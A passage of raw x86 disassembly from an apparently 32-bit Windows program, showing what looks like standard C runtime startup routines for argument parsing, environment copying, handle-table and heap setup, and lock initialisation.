  424d19:	jne    0x424d0e
  424d1b:	mov    cl,BYTE PTR [eax]
  424d1d:	test   cl,cl
  424d1f:	je     0x424d69
  424d21:	cmp    DWORD PTR [ebp-0x4],0x0
  424d25:	jne    0x424d31
  424d27:	cmp    cl,0x20
  424d2a:	je     0x424d69
  424d2c:	cmp    cl,0x9
  424d2f:	je     0x424d69
  424d31:	test   ebx,ebx
  424d33:	je     0x424d63
  424d35:	test   edi,edi
  424d37:	je     0x424d52
  424d39:	movzx  edx,cl
  424d3c:	test   BYTE PTR [edx+0x45df21],0x4
  424d43:	je     0x424d4b
  424d45:	mov    BYTE PTR [edi],cl
  424d47:	inc    edi
  424d48:	inc    eax
  424d49:	inc    DWORD PTR [esi]
  424d4b:	mov    cl,BYTE PTR [eax]
  424d4d:	mov    BYTE PTR [edi],cl
  424d4f:	inc    edi
  424d50:	jmp    0x424d61
  424d52:	movzx  ecx,cl
  424d55:	test   BYTE PTR [ecx+0x45df21],0x4
  424d5c:	je     0x424d61
  424d5e:	inc    eax
  424d5f:	inc    DWORD PTR [esi]
  424d61:	inc    DWORD PTR [esi]
  424d63:	inc    eax
  424d64:	jmp    0x424cd1
  424d69:	test   edi,edi
  424d6b:	je     0x424d71
  424d6d:	and    BYTE PTR [edi],0x0
  424d70:	inc    edi
  424d71:	inc    DWORD PTR [esi]
  424d73:	mov    ebx,DWORD PTR [ebp+0xc]
  424d76:	jmp    0x424c9c
  424d7b:	mov    eax,DWORD PTR [ebp+0x8]
  424d7e:	test   eax,eax
  424d80:	je     0x424d85
  424d82:	and    DWORD PTR [eax],0x0
  424d85:	inc    DWORD PTR [ebx]
  424d87:	pop    edi
  424d88:	pop    ebx
  424d89:	leave  
  424d8a:	ret    
  424d8b:	push   ebp
  424d8c:	mov    ebp,esp
  424d8e:	push   ecx
  424d8f:	push   ecx
  424d90:	push   ebx
  424d91:	push   esi
  424d92:	push   edi
  424d93:	xor    edi,edi
  424d95:	cmp    DWORD PTR ds:0x45e26c,edi
  424d9b:	jne    0x424da2
  424d9d:	call   0x425f2c
  424da2:	and    BYTE PTR ds:0x45dc14,0x0
  424da9:	push   0x104
  424dae:	mov    esi,0x45db10
  424db3:	push   esi
  424db4:	push   edi
  424db5:	call   DWORD PTR ds:0x429068
  424dbb:	mov    eax,ds:0x45e274
  424dc0:	cmp    eax,edi
  424dc2:	mov    DWORD PTR ds:0x45daf4,esi
  424dc8:	je     0x424dd1
  424dca:	cmp    BYTE PTR [eax],0x0
  424dcd:	mov    ebx,eax
  424dcf:	jne    0x424dd3
  424dd1:	mov    ebx,esi
  424dd3:	lea    eax,[ebp-0x4]
  424dd6:	push   eax
  424dd7:	push   edi
  424dd8:	lea    esi,[ebp-0x8]
  424ddb:	xor    ecx,ecx
  424ddd:	mov    eax,ebx
  424ddf:	call   0x424c1f
  424de4:	mov    esi,DWORD PTR [ebp-0x4]
  424de7:	mov    eax,DWORD PTR [ebp-0x8]
  424dea:	shl    esi,0x2
  424ded:	add    eax,esi
  424def:	push   eax
  424df0:	call   0x426062
  424df5:	mov    edi,eax
  424df7:	add    esp,0xc
  424dfa:	test   edi,edi
  424dfc:	jne    0x424e03
  424dfe:	or     eax,0xffffffff
  424e01:	jmp    0x424e28
  424e03:	lea    eax,[ebp-0x4]
  424e06:	push   eax
  424e07:	lea    ecx,[esi+edi*1]
  424e0a:	push   edi
  424e0b:	lea    esi,[ebp-0x8]
  424e0e:	mov    eax,ebx
  424e10:	call   0x424c1f
  424e15:	mov    eax,DWORD PTR [ebp-0x4]
  424e18:	dec    eax
  424e19:	pop    ecx
  424e1a:	mov    ds:0x45dad8,eax
  424e1f:	pop    ecx
  424e20:	mov    DWORD PTR ds:0x45dadc,edi
  424e26:	xor    eax,eax
  424e28:	pop    edi
  424e29:	pop    esi
  424e2a:	pop    ebx
  424e2b:	leave  
  424e2c:	ret    
  424e2d:	push   ecx
  424e2e:	push   ecx
  424e2f:	mov    eax,ds:0x45dc18
  424e34:	push   ebx
  424e35:	push   ebp
  424e36:	push   esi
  424e37:	push   edi
  424e38:	mov    edi,DWORD PTR ds:0x429080
  424e3e:	xor    ebx,ebx
  424e40:	xor    esi,esi
  424e42:	cmp    eax,ebx
  424e44:	push   0x2
  424e46:	pop    ebp
  424e47:	jne    0x424e76
  424e49:	call   edi
  424e4b:	mov    esi,eax
  424e4d:	cmp    esi,ebx
  424e4f:	je     0x424e5d
  424e51:	mov    DWORD PTR ds:0x45dc18,0x1
  424e5b:	jmp    0x424e7b
  424e5d:	call   DWORD PTR ds:0x429044
  424e63:	cmp    eax,0x78
  424e66:	jne    0x424e71
  424e68:	mov    eax,ebp
  424e6a:	mov    ds:0x45dc18,eax
  424e6f:	jmp    0x424e76
  424e71:	mov    eax,ds:0x45dc18
  424e76:	cmp    eax,0x1
  424e79:	jne    0x424ef8
  424e7b:	cmp    esi,ebx
  424e7d:	jne    0x424e87
  424e7f:	call   edi
  424e81:	mov    esi,eax
  424e83:	cmp    esi,ebx
  424e85:	je     0x424f00
  424e87:	cmp    WORD PTR [esi],bx
  424e8a:	mov    eax,esi
  424e8c:	je     0x424e9c
  424e8e:	add    eax,ebp
  424e90:	cmp    WORD PTR [eax],bx
  424e93:	jne    0x424e8e
  424e95:	add    eax,ebp
  424e97:	cmp    WORD PTR [eax],bx
  424e9a:	jne    0x424e8e
  424e9c:	mov    edi,DWORD PTR ds:0x42907c
  424ea2:	push   ebx
  424ea3:	push   ebx
  424ea4:	push   ebx
  424ea5:	sub    eax,esi
  424ea7:	push   ebx
  424ea8:	sar    eax,1
  424eaa:	inc    eax
  424eab:	push   eax
  424eac:	push   esi
  424ead:	push   ebx
  424eae:	push   ebx
  424eaf:	mov    DWORD PTR [esp+0x34],eax
  424eb3:	call   edi
  424eb5:	mov    ebp,eax
  424eb7:	cmp    ebp,ebx
  424eb9:	je     0x424eed
  424ebb:	push   ebp
  424ebc:	call   0x426062
  424ec1:	cmp    eax,ebx
  424ec3:	pop    ecx
  424ec4:	mov    DWORD PTR [esp+0x10],eax
  424ec8:	je     0x424eed
  424eca:	push   ebx
  424ecb:	push   ebx
  424ecc:	push   ebp
  424ecd:	push   eax
  424ece:	push   DWORD PTR [esp+0x24]
  424ed2:	push   esi
  424ed3:	push   ebx
  424ed4:	push   ebx
  424ed5:	call   edi
  424ed7:	test   eax,eax
  424ed9:	jne    0x424ee9
  424edb:	push   DWORD PTR [esp+0x10]
  424edf:	call   0x425f4a
  424ee4:	pop    ecx
  424ee5:	mov    DWORD PTR [esp+0x10],ebx
  424ee9:	mov    ebx,DWORD PTR [esp+0x10]
  424eed:	push   esi
  424eee:	call   DWORD PTR ds:0x429078
  424ef4:	mov    eax,ebx
  424ef6:	jmp    0x424f48
  424ef8:	cmp    eax,ebp
  424efa:	je     0x424f04
  424efc:	cmp    eax,ebx
  424efe:	je     0x424f04
  424f00:	xor    eax,eax
  424f02:	jmp    0x424f48
  424f04:	call   DWORD PTR ds:0x429074
  424f0a:	mov    esi,eax
  424f0c:	cmp    esi,ebx
  424f0e:	je     0x424f00
  424f10:	cmp    BYTE PTR [esi],bl
  424f12:	je     0x424f1e
  424f14:	inc    eax
  424f15:	cmp    BYTE PTR [eax],bl
  424f17:	jne    0x424f14
  424f19:	inc    eax
  424f1a:	cmp    BYTE PTR [eax],bl
  424f1c:	jne    0x424f14
  424f1e:	sub    eax,esi
  424f20:	inc    eax
  424f21:	mov    ebp,eax
  424f23:	push   ebp
  424f24:	call   0x426062
  424f29:	mov    edi,eax
  424f2b:	cmp    edi,ebx
  424f2d:	pop    ecx
  424f2e:	jne    0x424f34
  424f30:	xor    edi,edi
  424f32:	jmp    0x424f3f
  424f34:	push   ebp
  424f35:	push   esi
  424f36:	push   edi
  424f37:	call   0x426080
  424f3c:	add    esp,0xc
  424f3f:	push   esi
  424f40:	call   DWORD PTR ds:0x429070
  424f46:	mov    eax,edi
  424f48:	pop    edi
  424f49:	pop    esi
  424f4a:	pop    ebp
  424f4b:	pop    ebx
  424f4c:	pop    ecx
  424f4d:	pop    ecx
  424f4e:	ret    
  424f4f:	sub    esp,0x48
  424f52:	push   ebx
  424f53:	mov    ebx,0x480
  424f58:	push   ebx
  424f59:	call   0x426062
  424f5e:	test   eax,eax
  424f60:	pop    ecx
  424f61:	jne    0x424f6b
  424f63:	or     eax,0xffffffff
  424f66:	jmp    0x425148
  424f6b:	mov    ds:0x45e160,eax
  424f70:	mov    DWORD PTR ds:0x45e148,0x20
  424f7a:	lea    ecx,[eax+0x480]
  424f80:	jmp    0x424fa0
  424f82:	and    BYTE PTR [eax+0x4],0x0
  424f86:	or     DWORD PTR [eax],0xffffffff
  424f89:	and    DWORD PTR [eax+0x8],0x0
  424f8d:	mov    BYTE PTR [eax+0x5],0xa
  424f91:	mov    ecx,DWORD PTR ds:0x45e160
  424f97:	add    eax,0x24
  424f9a:	add    ecx,0x480
  424fa0:	cmp    eax,ecx
  424fa2:	jb     0x424f82
  424fa4:	push   ebp
  424fa5:	push   esi
  424fa6:	push   edi
  424fa7:	lea    eax,[esp+0x14]
  424fab:	push   eax
  424fac:	call   DWORD PTR ds:0x42904c
  424fb2:	cmp    WORD PTR [esp+0x46],0x0
  424fb8:	je     0x4250a7
  424fbe:	mov    eax,DWORD PTR [esp+0x48]
  424fc2:	test   eax,eax
  424fc4:	je     0x4250a7
  424fca:	mov    edi,DWORD PTR [eax]
  424fcc:	lea    ebp,[eax+0x4]
  424fcf:	lea    eax,[edi+ebp*1]
  424fd2:	mov    DWORD PTR [esp+0x10],eax
  424fd6:	mov    eax,0x800
  424fdb:	cmp    edi,eax
  424fdd:	jl     0x424fe1
  424fdf:	mov    edi,eax
  424fe1:	cmp    DWORD PTR ds:0x45e148,edi
  424fe7:	jge    0x425037
  424fe9:	mov    esi,0x45e164
  424fee:	push   ebx
  424fef:	call   0x426062
  424ff4:	test   eax,eax
  424ff6:	pop    ecx
  424ff7:	je     0x425031
  424ff9:	add    DWORD PTR ds:0x45e148,0x20
  425000:	mov    DWORD PTR [esi],eax
  425002:	lea    ecx,[eax+0x480]
  425008:	jmp    0x425020
  42500a:	and    BYTE PTR [eax+0x4],0x0
  42500e:	or     DWORD PTR [eax],0xffffffff
  425011:	and    DWORD PTR [eax+0x8],0x0
  425015:	mov    BYTE PTR [eax+0x5],0xa
  425019:	mov    ecx,DWORD PTR [esi]
  42501b:	add    eax,0x24
  42501e:	add    ecx,ebx
  425020:	cmp    eax,ecx
  425022:	jb     0x42500a
  425024:	add    esi,0x4
  425027:	cmp    DWORD PTR ds:0x45e148,edi
  42502d:	jl     0x424fee
  42502f:	jmp    0x425037
  425031:	mov    edi,DWORD PTR ds:0x45e148
  425037:	xor    ebx,ebx
  425039:	test   edi,edi
  42503b:	jle    0x4250a7
  42503d:	mov    eax,DWORD PTR [esp+0x10]
  425041:	mov    eax,DWORD PTR [eax]
  425043:	cmp    eax,0xffffffff
  425046:	je     0x42509c
  425048:	mov    cl,BYTE PTR [ebp+0x0]
  42504b:	test   cl,0x1
  42504e:	je     0x42509c
  425050:	test   cl,0x8
  425053:	jne    0x425060
  425055:	push   eax
  425056:	call   DWORD PTR ds:0x429088
  42505c:	test   eax,eax
  42505e:	je     0x42509c
  425060:	mov    ecx,ebx
  425062:	mov    eax,ebx
  425064:	and    eax,0x1f
  425067:	lea    eax,[eax+eax*8]
  42506a:	sar    ecx,0x5
  42506d:	mov    ecx,DWORD PTR [ecx*4+0x45e160]
  425074:	lea    esi,[ecx+eax*4]
  425077:	mov    eax,DWORD PTR [esp+0x10]
  42507b:	mov    eax,DWORD PTR [eax]
  42507d:	mov    DWORD PTR [esi],eax
  42507f:	mov    al,BYTE PTR [ebp+0x0]
  425082:	mov    BYTE PTR [esi+0x4],al
  425085:	lea    eax,[esi+0xc]
  425088:	push   0xfa0
  42508d:	push   eax
  42508e:	call   0x4263cd
  425093:	test   eax,eax
  425095:	pop    ecx
  425096:	pop    ecx
  425097:	je     0x4250c7
  425099:	inc    DWORD PTR [esi+0x8]
  42509c:	add    DWORD PTR [esp+0x10],0x4
  4250a1:	inc    ebx
  4250a2:	inc    ebp
  4250a3:	cmp    ebx,edi
  4250a5:	jl     0x42503d
  4250a7:	xor    ebx,ebx
  4250a9:	mov    ecx,DWORD PTR ds:0x45e160
  4250af:	lea    eax,[ebx+ebx*8]
  4250b2:	lea    esi,[ecx+eax*4]
  4250b5:	cmp    DWORD PTR [esi],0xffffffff
  4250b8:	jne    0x425129
  4250ba:	test   ebx,ebx
  4250bc:	mov    BYTE PTR [esi+0x4],0x81
  4250c0:	jne    0x4250cc
  4250c2:	push   0xfffffff6
  4250c4:	pop    eax
  4250c5:	jmp    0x4250d6
  4250c7:	or     eax,0xffffffff
  4250ca:	jmp    0x425145
  4250cc:	mov    eax,ebx
  4250ce:	dec    eax
  4250cf:	neg    eax
  4250d1:	sbb    eax,eax
  4250d3:	add    eax,0xfffffff5
  4250d6:	push   eax
  4250d7:	call   DWORD PTR ds:0x429064
  4250dd:	mov    edi,eax
  4250df:	cmp    edi,0xffffffff
  4250e2:	je     0x425123
  4250e4:	push   edi
  4250e5:	call   DWORD PTR ds:0x429088
  4250eb:	test   eax,eax
  4250ed:	je     0x425123
  4250ef:	and    eax,0xff
  4250f4:	cmp    eax,0x2
  4250f7:	mov    DWORD PTR [esi],edi
  4250f9:	jne    0x425101
  4250fb:	or     BYTE PTR [esi+0x4],0x40
  4250ff:	jmp    0x42510a
  425101:	cmp    eax,0x3
  425104:	jne    0x42510a
  425106:	or     BYTE PTR [esi+0x4],0x8
  42510a:	lea    eax,[esi+0xc]
  42510d:	push   0xfa0
  425112:	push   eax
  425113:	call   0x4263cd
  425118:	test   eax,eax
  42511a:	pop    ecx
  42511b:	pop    ecx
  42511c:	je     0x4250c7
  42511e:	inc    DWORD PTR [esi+0x8]
  425121:	jmp    0x42512d
  425123:	or     BYTE PTR [esi+0x4],0x40
  425127:	jmp    0x42512d
  425129:	or     BYTE PTR [esi+0x4],0x80
  42512d:	inc    ebx
  42512e:	cmp    ebx,0x3
  425131:	jl     0x4250a9
  425137:	push   DWORD PTR ds:0x45e148
  42513d:	call   DWORD PTR ds:0x429084
  425143:	xor    eax,eax
  425145:	pop    edi
  425146:	pop    esi
  425147:	pop    ebp
  425148:	pop    ebx
  425149:	add    esp,0x48
  42514c:	ret    
  42514d:	push   0xc
  42514f:	push   0x4295b0
  425154:	call   0x425340
  425159:	mov    DWORD PTR [ebp-0x1c],0x42a008
  425160:	cmp    DWORD PTR [ebp-0x1c],0x42a008
  425167:	jae    0x42518b
  425169:	and    DWORD PTR [ebp-0x4],0x0
  42516d:	mov    eax,DWORD PTR [ebp-0x1c]
  425170:	mov    eax,DWORD PTR [eax]
  425172:	test   eax,eax
  425174:	je     0x425181
  425176:	call   eax
  425178:	jmp    0x425181
  42517a:	xor    eax,eax
  42517c:	inc    eax
  42517d:	ret    
  42517e:	mov    esp,DWORD PTR [ebp-0x18]
  425181:	or     DWORD PTR [ebp-0x4],0xffffffff
  425185:	add    DWORD PTR [ebp-0x1c],0x4
  425189:	jmp    0x425160
  42518b:	call   0x42537b
  425190:	ret    
  425191:	push   0xc
  425193:	push   0x4295c0
  425198:	call   0x425340
  42519d:	mov    DWORD PTR [ebp-0x1c],0x42a010
  4251a4:	cmp    DWORD PTR [ebp-0x1c],0x42a010
  4251ab:	jae    0x4251cf
  4251ad:	and    DWORD PTR [ebp-0x4],0x0
  4251b1:	mov    eax,DWORD PTR [ebp-0x1c]
  4251b4:	mov    eax,DWORD PTR [eax]
  4251b6:	test   eax,eax
  4251b8:	je     0x4251c5
  4251ba:	call   eax
  4251bc:	jmp    0x4251c5
  4251be:	xor    eax,eax
  4251c0:	inc    eax
  4251c1:	ret    
  4251c2:	mov    esp,DWORD PTR [ebp-0x18]
  4251c5:	or     DWORD PTR [ebp-0x4],0xffffffff
  4251c9:	add    DWORD PTR [ebp-0x1c],0x4
  4251cd:	jmp    0x4251a4
  4251cf:	call   0x42537b
  4251d4:	ret    
  4251d5:	call   0x425416
  4251da:	mov    eax,ds:0x45d304
  4251df:	cmp    eax,0xffffffff
  4251e2:	je     0x4251f2
  4251e4:	push   eax
  4251e5:	call   DWORD PTR ds:0x429090
  4251eb:	or     DWORD PTR ds:0x45d304,0xffffffff
  4251f2:	ret    
  4251f3:	push   ebx
  4251f4:	push   esi
  4251f5:	call   DWORD PTR ds:0x429044
  4251fb:	push   DWORD PTR ds:0x45d304
  425201:	mov    ebx,eax
  425203:	call   DWORD PTR ds:0x4290a0
  425209:	mov    esi,eax
  42520b:	test   esi,esi
  42520d:	jne    0x425258
  42520f:	push   0x88
  425214:	push   0x1
  425216:	call   0x426458
  42521b:	mov    esi,eax
  42521d:	test   esi,esi
  42521f:	pop    ecx
  425220:	pop    ecx
  425221:	je     0x425250
  425223:	push   esi
  425224:	push   DWORD PTR ds:0x45d304
  42522a:	call   DWORD PTR ds:0x42909c
  425230:	test   eax,eax
  425232:	je     0x425250
  425234:	mov    DWORD PTR [esi+0x54],0x45d258
  42523b:	mov    DWORD PTR [esi+0x14],0x1
  425242:	call   DWORD PTR ds:0x429098
  425248:	or     DWORD PTR [esi+0x4],0xffffffff
  42524c:	mov    DWORD PTR [esi],eax
  42524e:	jmp    0x425258
  425250:	push   0x10
  425252:	call   0x424406
  425257:	pop    ecx
  425258:	push   ebx
  425259:	call   DWORD PTR ds:0x429094
  42525f:	mov    eax,esi
  425261:	pop    esi
  425262:	pop    ebx
  425263:	ret    
  425264:	call   0x4253cd
  425269:	test   eax,eax
  42526b:	je     0x42527d
  42526d:	call   DWORD PTR ds:0x4290a4
  425273:	cmp    eax,0xffffffff
  425276:	mov    ds:0x45d304,eax
  42527b:	jne    0x425285
  42527d:	call   0x4251d5
  425282:	xor    eax,eax
  425284:	ret    
  425285:	push   esi
  425286:	push   0x88
  42528b:	push   0x1
  42528d:	call   0x426458
  425292:	mov    esi,eax
  425294:	test   esi,esi
  425296:	pop    ecx
  425297:	pop    ecx
  425298:	je     0x4252ca
  42529a:	push   esi
  42529b:	push   DWORD PTR ds:0x45d304
  4252a1:	call   DWORD PTR ds:0x42909c
  4252a7:	test   eax,eax
  4252a9:	je     0x4252ca
  4252ab:	mov    DWORD PTR [esi+0x54],0x45d258
  4252b2:	mov    DWORD PTR [esi+0x14],0x1
  4252b9:	call   DWORD PTR ds:0x429098
  4252bf:	or     DWORD PTR [esi+0x4],0xffffffff
  4252c3:	mov    DWORD PTR [esi],eax
  4252c5:	xor    eax,eax
  4252c7:	inc    eax
  4252c8:	pop    esi
  4252c9:	ret    
  4252ca:	call   0x4251d5
  4252cf:	xor    eax,eax
  4252d1:	pop    esi
  4252d2:	ret    
  4252d3:	cmp    DWORD PTR ds:0x45dac4,0x2
  4252da:	jne    0x4252e9
  4252dc:	cmp    DWORD PTR ds:0x45dad0,0x5
  4252e3:	jb     0x4252e9
  4252e5:	xor    eax,eax
  4252e7:	inc    eax
  4252e8:	ret    
  4252e9:	push   0x3
  4252eb:	pop    eax
  4252ec:	ret    
  4252ed:	xor    eax,eax
  4252ef:	cmp    DWORD PTR [esp+0x4],eax
  4252f3:	push   0x0
  4252f5:	sete   al
  4252f8:	push   0x1000
  4252fd:	push   eax
  4252fe:	call   DWORD PTR ds:0x429034
  425304:	test   eax,eax
  425306:	mov    ds:0x45e140,eax
  42530b:	je     0x425337
  42530d:	call   0x4252d3
  425312:	cmp    eax,0x3
  425315:	mov    ds:0x45e144,eax
  42531a:	jne    0x42533a
  42531c:	push   0x3f8
  425321:	call   0x4266da
  425326:	test   eax,eax
  425328:	pop    ecx
  425329:	jne    0x42533a
  42532b:	push   DWORD PTR ds:0x45e140
  425331:	call   DWORD PTR ds:0x4290a8
  425337:	xor    eax,eax
  425339:	ret    
  42533a:	xor    eax,eax
  42533c:	inc    eax
  42533d:	ret    
  42533e:	int3   
  42533f:	int3   
  425340:	push   0x427208
  425345:	mov    eax,fs:0x0
  42534b:	push   eax
  42534c:	mov    eax,DWORD PTR [esp+0x10]
  425350:	mov    DWORD PTR [esp+0x10],ebp
  425354:	lea    ebp,[esp+0x10]
  425358:	sub    esp,eax
  42535a:	push   ebx
  42535b:	push   esi
  42535c:	push   edi
  42535d:	mov    eax,DWORD PTR [ebp-0x8]
  425360:	mov    DWORD PTR [ebp-0x18],esp
  425363:	push   eax
  425364:	mov    eax,DWORD PTR [ebp-0x4]
  425367:	mov    DWORD PTR [ebp-0x4],0xffffffff
  42536e:	mov    DWORD PTR [ebp-0x8],eax
  425371:	lea    eax,[ebp-0x10]
  425374:	mov    fs:0x0,eax
  42537a:	ret    
  42537b:	mov    ecx,DWORD PTR [ebp-0x10]
  42537e:	mov    DWORD PTR fs:0x0,ecx
  425385:	pop    ecx
  425386:	pop    edi
  425387:	pop    esi
  425388:	pop    ebx
  425389:	leave  
  42538a:	push   ecx
  42538b:	ret    
  42538c:	int3   
  42538d:	int3   
  42538e:	int3   
  42538f:	int3   
  425390:	cmp    eax,0x1000
  425395:	jae    0x4253a5
  425397:	neg    eax
  425399:	add    eax,esp
  42539b:	add    eax,0x4
  42539e:	test   DWORD PTR [eax],eax
  4253a0:	xchg   esp,eax
  4253a1:	mov    eax,DWORD PTR [eax]
  4253a3:	push   eax
  4253a4:	ret    
  4253a5:	push   ecx
  4253a6:	lea    ecx,[esp+0x8]
  4253aa:	sub    ecx,0x1000
  4253b0:	sub    eax,0x1000
  4253b5:	test   DWORD PTR [ecx],eax
  4253b7:	cmp    eax,0x1000
  4253bc:	jae    0x4253aa
  4253be:	sub    ecx,eax
  4253c0:	mov    eax,esp
  4253c2:	test   DWORD PTR [ecx],eax
  4253c4:	mov    esp,ecx
  4253c6:	mov    ecx,DWORD PTR [eax]
  4253c8:	mov    eax,DWORD PTR [eax+0x4]
  4253cb:	push   eax
  4253cc:	ret    
  4253cd:	push   esi
  4253ce:	push   edi
  4253cf:	xor    esi,esi
  4253d1:	mov    edi,0x45dc20
  4253d6:	cmp    DWORD PTR [esi*8+0x45d314],0x1
  4253de:	jne    0x4253fe
  4253e0:	lea    eax,[esi*8+0x45d310]
  4253e7:	mov    DWORD PTR [eax],edi
  4253e9:	push   0xfa0
  4253ee:	push   DWORD PTR [eax]
  4253f0:	add    edi,0x18
  4253f3:	call   0x4263cd
  4253f8:	test   eax,eax
  4253fa:	pop    ecx
  4253fb:	pop    ecx
  4253fc:	je     0x42540a
  4253fe:	inc    esi
  4253ff:	cmp    esi,0x24
  425402:	jl     0x4253d6
  425404:	xor    eax,eax
  425406:	inc    eax
  425407:	pop    edi
  425408:	pop    esi
  425409:	ret    
  42540a:	and    DWORD PTR [esi*8+0x45d310],0x0
  425412:	xor    eax,eax
  425414:	jmp    0x425407
  425416:	push   ebx
  425417:	mov    ebx,DWORD PTR ds:0x42908c
  42541d:	push   esi
  42541e:	mov    esi,0x45d310
  425423:	push   edi
  425424:	mov    edi,DWORD PTR [esi]
  425426:	test   edi,edi
  425428:	je     0x42543d
  42542a:	cmp    DWORD PTR [esi+0x4],0x1
  42542e:	je     0x42543d
  425430:	push   edi
  425431:	call   ebx
  425433:	push   edi
  425434:	call   0x425f4a
  425439:	and    DWORD PTR [esi],0x0
  42543c:	pop    ecx
  42543d:	add    esi,0x8
  425440:	cmp    esi,0x45d430
  425446:	jl     0x425424
  425448:	mov    esi,0x45d310
  42544d:	pop    edi
  42544e:	mov    eax,DWORD PTR [esi]
  425450:	test   eax,eax
  425452:	je     0x42545d
  425454:	cmp    DWORD PTR [esi+0x4],0x1
  425458:	jne    0x42545d
  42545a:	push   eax
  42545b:	call   ebx
  42545d:	add    esi,0x8
  425460:	cmp    esi,0x45d430
  425466:	jl     0x42544e
  425468:	pop    esi
  425469:	pop    ebx
  42546a:	ret    
  42546b:	push   ebp
  42546c:	mov    ebp,esp
  42546e:	mov    eax,DWORD PTR [ebp+0x8]
  425471:	push   DWORD PTR [eax*8+0x45d310]
  425478:	call   DWORD PTR ds:0x4290b0
  42547e:	pop    ebp
  42547f:	ret    
  425480:	push   ebp
  425481:	mov    ebp,esp
  425483:	push   esi
  425484:	mov    esi,DWORD PTR [ebp+0x8]
  425487:	lea    esi,[esi*8+0x45d310]
  42548e:	cmp    DWORD PTR [esi],0x0
  425491:	je     0x425498
  425493:	xor    eax,eax
  425495:	inc    eax
  425496:	jmp    0x4254fc
  425498:	push   edi
  425499:	push   0x18
  42549b:	call   0x426062
  4254a0:	mov    edi,eax
  4254a2:	test   edi,edi
  4254a4:	pop    ecx
  4254a5:	jne    0x4254b6
  4254a7:	call   0x4272e0
  4254ac:	mov    DWORD PTR [eax],0xc
  4254b2:	xor    eax,eax
  4254b4:	jmp    0x4254fb
  4254b6:	push   0xa
  4254b8:	call   0x4254ff
  4254bd:	cmp    DWORD PTR [esi],0x0
  4254c0:	pop    ecx
  4254c1:	jne    0x4254e9
  4254c3:	push   0xfa0
  4254c8:	push   edi
  4254c9:	call   0x4263cd
  4254ce:	test   eax,eax
  4254d0:	pop    ecx
  4254d1:	pop    ecx
  4254d2:	jne    0x4254e5
  4254d4:	push   edi
  4254d5:	call   0x425f4a
  4254da:	push   0xa
  4254dc:	call   0x42546b
  4254e1:	pop    ecx
  4254e2:	pop    ecx
  4254e3:	jmp    0x4254a7
  4254e5:	mov    DWORD PTR [esi],edi
  4254e7:	jmp    0x4254f0
  4254e9:	push   edi
  4254ea:	call   0x425f4a
  4254ef:	pop    ecx
  4254f0:	push   0xa
  4254f2:	call   0x42546b
  4254f7:	xor    eax,eax
  4254f9:	pop    ecx
  4254fa:	inc    eax
  4254fb:	pop    edi
  4254fc:	pop    esi
  4254fd:	pop    ebp
  4254fe:	ret    
  4254ff:	push   ebp
  425500:	mov    ebp,esp
  425502:	mov    eax,DWORD PTR [ebp+0x8]
  425505:	push   esi
  425506:	lea    esi,[eax*8+0x45d310]
  42550d:	cmp    DWORD PTR [esi],0x0
  425510:	jne    0x425525
  425512:	push   eax
  425513:	call   0x425480
  425518:	test   eax,eax
  42551a:	pop    ecx
  42551b:	jne    0x425525
  42551d:	push   0x11
  42551f:	call   0x424406
  425524:	pop    ecx
  425525:	push   DWORD PTR [esi]
  425527:	call   DWORD PTR ds:0x4290b4
  42552d:	pop    esi
  42552e:	pop    ebp
  42552f:	ret    
  425530:	push   esi
  425531:	push   DWORD PTR ds:0x45e268
  425537:	call   0x427496
  42553c:	pop    ecx
  42553d:	mov    ecx,DWORD PTR ds:0x45e264
  425543:	mov    esi,eax
  425545:	mov    eax,ds:0x45e268
  42554a:	mov    edx,ecx
  42554c:	sub    edx,eax
  42554e:	add    edx,0x4
  425551:	cmp    esi,edx
  425553:	jae    0x4255a3
  425555:	mov    ecx,0x800
  42555a:	cmp    esi,ecx
  42555c:	jae    0x425560
  42555e:	mov    ecx,esi
  425560:	add    ecx,esi
  425562:	push   ecx
  425563:	push   eax
  425564:	call   0x4272e9
  425569:	test   eax,eax
  42556b:	pop    ecx
  42556c:	pop    ecx
  42556d:	jne    0x425586
  42556f:	add    esi,0x10
  425572:	push   esi
  425573:	push   DWORD PTR ds:0x45e268
  425579:	call   0x4272e9
  42557e:	test   eax,eax
  425580:	pop    ecx
  425581:	pop    ecx
  425582:	jne    0x425586
  425584:	pop    esi
  425585:	ret    
  425586:	mov    ecx,DWORD PTR ds:0x45e264
  42558c:	sub    ecx,DWORD PTR ds:0x45e268
  425592:	mov    ds:0x45e268,eax
  425597:	sar    ecx,0x2
  42559a:	lea    ecx,[eax+ecx*4]
  42559d:	mov    DWORD PTR ds:0x45e264,ecx
  4255a3:	mov    DWORD PTR [ecx],edi
  4255a5:	add    DWORD PTR ds:0x45e264,0x4
  4255ac:	mov    eax,edi
  4255ae:	pop    esi
  4255af:	ret    
  4255b0:	push   0x80
  4255b5:	call   0x426062
  4255ba:	test   eax,eax
  4255bc:	pop    ecx
  4255bd:	mov    ds:0x45e268,eax
  4255c2:	jne    0x4255c8
  4255c4:	push   0x18
  4255c6:	pop    eax
  4255c7:	ret    
  4255c8:	and    DWORD PTR [eax],0x0
  4255cb:	mov    eax,ds:0x45e268
  4255d0:	mov    ds:0x45e264,eax
  4255d5:	xor    eax,eax
  4255d7:	ret    
  4255d8:	push   0xc
  4255da:	push   0x4295d0
  4255df:	call   0x425340
  4255e4:	call   0x424651
  4255e9:	and    DWORD PTR [ebp-0x4],0x0
  4255ed:	mov    edi,DWORD PTR [ebp+0x8]
  4255f0:	call   0x425530
  4255f5:	mov    DWORD PTR [ebp-0x1c],eax
  4255f8:	or     DWORD PTR [ebp-0x4],0xffffffff
  4255fc:	call   0x42560a
  425601:	mov    eax,DWORD PTR [ebp-0x1c]
  425604:	call   0x42537b
  425609:	ret    
  42560a:	call   0x42465a
  42560f:	ret    
  425610:	push   DWORD PTR [esp+0x4]
  425614:	call   0x4255d8
  425619:	neg    eax
  42561b:	sbb    eax,eax
  42561d:	neg    eax
  42561f:	pop    ecx
  425620:	dec    eax
  425621:	ret    
  425622:	push   ebp
  425623:	mov    ebp,esp
  425625:	sub    esp,0x10
  425628:	push   ebx
  425629:	xor    ebx,ebx
  42562b:	cmp    DWORD PTR ds:0x45dd70,ebx
  425631:	push   esi
  425632:	push   edi
  425633:	jne    0x4256a2
  425635:	push   0x429640
  42563a:	call   DWORD PTR ds:0x4290b8
  425640:	mov    edi,eax
  425642:	cmp    edi,ebx
  425644:	je     0x4256dd
  42564a:	mov    esi,DWORD PTR ds:0x429020
  425650:	push   0x429634
  425655:	push   edi
  425656:	call   esi
  425658:	test   eax,eax
  42565a:	mov    ds:0x45dd70,eax
  42565f:	je     0x4256dd
  425661:	push   0x429624
  425666:	push   edi
  425667:	call   esi
  425669:	push   0x429610
  42566e:	push   edi
